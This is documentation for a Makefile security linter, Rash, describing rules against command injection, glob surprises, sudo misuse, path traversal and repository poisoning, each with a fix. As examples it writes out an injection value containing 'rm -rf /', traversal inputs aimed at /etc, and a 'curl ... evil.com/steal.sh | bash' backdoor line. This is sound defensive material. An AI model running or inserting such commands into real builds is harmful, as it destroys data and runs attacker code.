# Makefile Security

Rash detects security vulnerabilities in Makefiles, including command injection, unsafe shell usage, and privilege escalation risks.

## Security Rules

### MAKE003: Command Injection via Unquoted Variables

**Risk**: HIGH - Arbitrary command execution

**Problem**: Unquoted variables in shell commands allow injection attacks.

```makefile
# ❌ DANGEROUS: Command injection vulnerability
install:
	cp $(FILE) /usr/local/bin/  # Attacker: FILE="../../../etc/passwd; rm -rf /"
```

**Attack Vector**:
```bash
$ make FILE="../../../etc/passwd; rm -rf /" install
# Executes: cp ../../../etc/passwd; rm -rf / /usr/local/bin/
```

**Solution**: Always quote variables in shell commands.

```makefile
# ✅ SAFE: Quoted variable prevents injection
install:
	cp "$(FILE)" /usr/local/bin/
```

**Detection**:
```bash
$ rash lint Makefile
MAKE003: Potential command injection
  --> Makefile:2
   |
 2 |     cp $(FILE) /usr/local/bin/
   |        ^^^^^^^ unquoted variable in shell command
   |
   = help: Quote variable to prevent injection
   = fix: cp "$(FILE)" /usr/local/bin/
```

### MAKE004: Unsafe Shell Metacharacters

**Risk**: MEDIUM - Unintended shell expansion

**Problem**: Shell metacharacters (`*`, `?`, `[`, `]`) expand unexpectedly.

```makefile
# ❌ RISKY: Glob expansion may surprise
clean:
	rm -f *.o  # What if there's a file named "-rf"?
```

**Attack Vector**:
```bash
$ touch -- "-rf"
$ make clean
# Executes: rm -f -rf *.o
# May delete more than intended!
```

**Solution**: Use explicit file lists or find with -delete.

```makefile
# ✅ SAFER: Explicit file list
OBJS := $(sort $(wildcard *.o))

clean:
	rm -f $(OBJS)
```

### MAKE009: Privilege Escalation via sudo

**Risk**: CRITICAL - Root access abuse

**Problem**: Makefiles running sudo without validation.

```makefile
# ❌ DANGEROUS: Unrestricted sudo
install:
	sudo cp app /usr/local/bin/
	sudo chmod 4755 /usr/local/bin/app  # Sets SUID bit!
```

**Solution**: Use install(1) or warn users about sudo.

```makefile
# ✅ BETTER: Use install command
install:
	@if [ "$(shell id -u)" != "0" ]; then \
		echo "Error: Must run as root or with sudo"; \
		exit 1; \
	fi
	install -m 755 app /usr/local/bin/app
```

**Detection**:
```bash
$ rash lint Makefile
MAKE009: Unsafe sudo usage
  --> Makefile:3
   |
 3 |     sudo chmod 4755 /usr/local/bin/app
   |     ^^^^ unrestricted sudo with dangerous permissions
   |
   = warning: SUID bit grants root privileges
   = help: Use install(1) or check permissions explicitly
```

## Real-World Attack Scenarios

### Scenario 1: Repository Poisoning

**Attack**: Malicious Makefile in cloned repository

```makefile
# Attacker's Makefile
.PHONY: all
all:
	@echo "Building project..."
	@curl -s https://evil.com/steal.sh | bash  # ❌ Backdoor
	gcc -o app main.c
```

**Defense**:
```bash
# Always review Makefiles before running make
$ rash lint Makefile
MAKE007: Suspicious network access in recipe
  --> Makefile:4
   |
 4 |     @curl -s https://evil.com/steal.sh | bash
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ downloads and executes remote code
   |
   = error: Potential backdoor or data exfiltration
   = help: Review all network operations in build scripts
```

### Scenario 2: Dependency Confusion

**Attack**: Typosquatting in shell commands

```makefile
# ❌ Typo allows attacker to substitute malicious binary
build:
	nmp install  # Should be "npm", but PATH includes attacker's "nmp"
```

**Defense**:
```makefile
# ✅ Use absolute paths for critical tools
NPM := /usr/bin/npm

build:
	$(NPM) install
```

### Scenario 3: Path Traversal

**Attack**: Writing files outside build directory

```makefile
# ❌ DANGEROUS: Allows path traversal
OUTPUT_DIR := $(PREFIX)/output

install:
	cp build/* $(OUTPUT_DIR)/
	# Attacker: make PREFIX=../../../etc install
```

**Defense**:
```makefile
# ✅ SAFE: Validate PREFIX and use absolute paths
PREFIX ?= /usr/local
OUTPUT_DIR := $(realpath $(PREFIX))/output

install:
	@if [ -z "$(realpath $(PREFIX))" ]; then \
		echo "Error: Invalid PREFIX"; \
		exit 1; \
	fi
	cp build/* "$(OUTPUT_DIR)/"
```

## Security Best Practices

### 1. Principle of Least Privilege

```makefile
# ❌ BAD: Runs everything as root
.PHONY: all install
all:
	sudo make build  # Unnecessary root access

install:
	sudo cp app /usr/local/bin/
```

**Better**:
```makefile
# ✅ GOOD: Only elevate when necessary
.PHONY: all install
all:
	make build  # Build as regular user

install:
	@if [ "$(shell id -u)" != "0" ]; then \
		echo "Run: sudo make install"; \
		exit 1; \
	fi
	install -m 755 app /usr/local/bin/
```

### 2. Input Validation

```makefile
# ✅ Validate all user-provided variables
PREFIX ?= /usr/local

install:
	@if [ -z "$(PREFIX)" ] || echo "$(PREFIX)" | grep -q '\.\.' ; then \
		echo "Error: Invalid PREFIX"; \
		exit 1; \
	fi
	install -m 755 app "$(PREFIX)/bin/"
```

### 3. Avoid Eval and Shell Expansion

```makefile
# ❌ DANGEROUS: eval() equivalent
COMMAND := $(shell cat commands.txt)
run:
	$(COMMAND)  # Executes arbitrary commands from file
```

**Safer**:
```makefile
# ✅ Explicit command list
VALID_COMMANDS := build test clean

run:
	@if ! echo "$(VALID_COMMANDS)" | grep -qw "$(CMD)"; then \
		echo "Error: Unknown command $(CMD)"; \
		exit 1; \
	fi
	@$(CMD)
```

### 4. Secure File Permissions

```makefile
# ✅ Use appropriate permissions
install:
	install -m 755 app /usr/local/bin/app          # Executable, not writable
	install -m 644 app.conf /etc/app/app.conf      # Config, not executable
	install -m 600 app.key /etc/app/app.key        # Secret, owner-only
```

## Security Checklist

Before deploying a Makefile:

- [ ] ✅ Run `rash lint Makefile` to detect vulnerabilities
- [ ] ✅ Quote all variables used in shell commands
- [ ] ✅ Validate user-provided inputs (PREFIX, DESTDIR, etc.)
- [ ] ✅ Use absolute paths for critical binaries
- [ ] ✅ Avoid running unnecessary commands as root
- [ ] ✅ Set minimal file permissions with install(1)
- [ ] ✅ Review all network operations (curl, wget, git clone)
- [ ] ✅ Check for path traversal vulnerabilities
- [ ] ✅ Avoid eval-like constructs
- [ ] ✅ Test with malicious inputs (fuzzing)

## Automated Security Scanning

```bash
# Run security linter
$ rash lint --security-only Makefile

# CI/CD integration
# .github/workflows/security.yml
- name: Security Scan
  run: |
    cargo install bashrs
    rash lint --security-only Makefile
    if [ $? -ne 0 ]; then
      echo "Security vulnerabilities detected!"
      exit 1
    fi
```

## Resources

- [Reproducible Builds](https://reproducible-builds.org/)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

---

**Remember**: Makefiles execute arbitrary shell commands - treat them like executable code, not configuration files!
